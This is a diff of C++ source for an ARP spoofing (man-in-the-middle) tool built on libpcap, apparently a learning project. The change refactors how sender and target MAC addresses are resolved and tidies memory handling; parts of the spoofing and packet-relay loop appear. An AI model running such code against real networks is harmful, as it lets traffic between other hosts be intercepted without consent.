@@ -9,9 +9,10 @@ void sig_handler(int signo){
     printf("Turn off arpspoofing\n");
 }
 
-void arp_spoofing::SetTarget(const u_char* ip){
+Address* arp_spoofing::SetAddress(const u_char* ip){
     arp_packet* REQ_PACKET = MakeRequestPacket(ip);
     arp_packet* REP_PACKET;
+    Address* addr;
     u_char* spacket = REQ_PACKET->ToPacket60();
 
     while(true){
@@ -21,15 +22,13 @@ void arp_spoofing::SetTarget(const u_char* ip){
         const u_char* packet;
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
-        if (res == -1 || res == -2) return;
+        if (res == -1 || res == -2) break;
 
-        if (arpcd::IsReplyPacket(packet,
-                                 ip,
-                                 Attacker->GetMacAddress())){
+        if (arpcd::IsReplyPacket(packet, ip)){
             REP_PACKET = new arp_packet(packet);
-            Target = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
+            addr = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
             printf("Catch Gateway REPLY\nMac: ");
-            print(Target->GetMacAddress(), MAC_SIZE);
+            print(addr->GetMacAddress(), MAC_SIZE);
             break;
         }
     }
@@ -37,37 +36,9 @@ void arp_spoofing::SetTarget(const u_char* ip){
     delete[] spacket;
     delete REQ_PACKET;
     delete REP_PACKET;
+    return addr;
 }
 
-void arp_spoofing::SetSender(const u_char* ip){
-    arp_packet* REQ_PACKET = MakeRequestPacket(ip);
-    arp_packet* REP_PACKET;
-    u_char* req_packet = REQ_PACKET->ToPacket60();
-
-    while(true){
-        pcap_sendpacket(handle, req_packet, 60);
-
-        struct pcap_pkthdr* header;
-        const u_char* packet;
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) return;
-
-        if (arpcd::IsReplyPacket(packet,
-                                 ip,
-                                 Attacker->GetMacAddress())){
-            REP_PACKET = new arp_packet(packet);
-            Sender = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
-            printf("Catch REPLY\nMac: ");
-            print(Sender->GetMacAddress(), MAC_SIZE);
-            break;
-        }
-    }
-
-    delete REQ_PACKET;
-    delete REP_PACKET;
-    delete[] req_packet;
-}
 
 void arp_spoofing::SetAttacker(){
     Attacker = new Address(getinfo::get_my_mac_address(Dev), getinfo::get_my_ipv4_address(Dev));
@@ -76,17 +47,21 @@ void arp_spoofing::SetAttacker(){
 void arp_spoofing::Init(const char* sender, const char* target){
     char errbuf[PCAP_ERRBUF_SIZE];
     handle = pcap_open_live(Dev, BUFSIZ, 1, 1, errbuf);
+    u_char* sender_hex = conv::ipv4_to_hex(sender);
+    u_char* target_hex = conv::ipv4_to_hex(target);
 
     printf("Sender IP: %s\nTarget IP: %s\n", sender, target);
-    u_char* sender_hex =conv::ipv4_to_hex(sender);
     printf("[-] Set Attacker...\n");
     SetAttacker();
-    printf("[-] Set Sender..\n");
-    SetSender(sender_hex);
-    print(Sender->GetMacAddress(), MAC_SIZE);
-    printf("[-] Set Target...\n");
-    SetTarget(conv::ipv4_to_hex(target));
 
+    printf("[-] Set Sender..\n");
+    Sender = SetAddress(sender_hex);
+
+    printf("[-] Set Target...\n");
+    Target = SetAddress(target_hex);
+
+    delete[] target_hex;
+    delete[] sender_hex;
     signal(SIGINT, sig_handler);
 }
 
@@ -107,7 +82,7 @@ void arp_spoofing::ExecuteArpSpoofing() {
            		pcap_sendpacket(handle, attack_packet, 58);
         	}
 		}
-        else if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress(), Attacker->GetMacAddress())){
+        else if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress())){
             int packet_size = (int)header->len;
             u_char* relay_packet = new u_char[packet_size];
             u_char* attacker_mac = Attacker->GetMacAddress();
